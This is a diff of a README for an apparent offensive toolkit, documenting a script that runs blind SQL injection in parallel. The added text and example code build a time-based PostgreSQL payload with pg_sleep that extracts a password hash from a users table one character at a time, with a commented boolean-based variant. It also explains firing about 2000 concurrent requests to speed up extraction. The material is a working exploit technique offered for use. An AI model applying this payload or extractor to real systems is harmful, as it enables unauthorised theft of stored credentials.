@@ -211,10 +211,10 @@ fetch('/admin/users', {
 
 ### sqli_parallel.py
 
-Paste `extract_string_blind()` into your script. Write a `check_fn(index, char) -> bool` for your target and pass it in:
+Paste `extract_string_blind()` into your script. The only thing you write is one function, `is_correct_char(index, char) -> bool`, that returns True when `char` is correct at position `index` (1-based). Pass it in and the extractor pulls the whole string:
 
 ```python
-def my_check(index: int, char: str) -> bool:
+def is_correct_char(index: int, char: str) -> bool:
     # Time-based (PostgreSQL)
     sqli = f"(SELECT CASE WHEN (SUBSTRING((SELECT password FROM users LIMIT 1),{index},1)='{char}') THEN pg_sleep(3) ELSE NULL END)"
     t0 = time.time()
@@ -226,7 +226,7 @@ def my_check(index: int, char: str) -> bool:
     # r = session.get(TARGET + "/search", params={"q": sqli})
     # return "Welcome" in r.text
 
-result = extract_string_blind(my_check, length=32, label="password hash")
+result = extract_string_blind(is_correct_char, length=32, label="password hash")
 ```
 
 All `(position, character)` combinations are submitted at once. The thread pool caps concurrency at `max_workers=30`. For a 32-char string over a 62-char charset, that's ~2000 tasks – done in roughly the time it takes to test a single character sequentially.
